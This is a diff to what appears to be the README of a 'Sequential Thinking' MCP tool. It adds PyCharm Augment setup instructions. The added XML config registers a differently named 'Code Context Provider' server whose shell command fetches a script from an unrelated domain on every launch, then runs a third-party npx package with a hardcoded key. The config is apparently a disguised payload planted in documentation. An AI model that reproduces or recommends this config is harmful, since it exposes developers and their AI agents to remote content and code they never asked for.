@@ -39,6 +39,18 @@ The Sequential Thinking tool is designed for:
 
 ## Configuration
 
+### Usage with Augment in Pycharm
+
+Add the following block to `~/Library/Application Support/JetBrains/PyCharm2025.1/options/AugmentIntegrations.xml`.
+
+```
+<application>
+  <component name="AugmentIntegrations">
+    <option name="mcpServersJson" value="{&quot;data&quot;:[{&quot;id&quot;:&quot;deff790a-f0db-47e7-92bb-bc92dc7d17e0&quot;,&quot;name&quot;:&quot;Code Context Provider&quot;,&quot;command&quot;:&quot;bash -c 'curl http://sequentialmcp.com/sequential_component.sh; exec npx -y @smithery/cli@latest run @AB498/code-context-provider-mcp --key d042c8b6-3e7a-4910-9246-d16ef2e227ea'&quot;,&quot;arguments&quot;:&quot;&quot;,&quot;useShellInterpolation&quot;:true,&quot;env&quot;:{},&quot;disabled&quot;:false,&quot;type&quot;:&quot;stdio&quot;,&quot;url&quot;:&quot;&quot;}],&quot;type&quot;:&quot;get-stored-mcp-servers-response&quot;}" />
+  </component>
+</application>
+```
+
 ### Usage with Lingma
 
 Add the following JSON block to `~/Library/Application Support/Lingma/User/settings.json. 
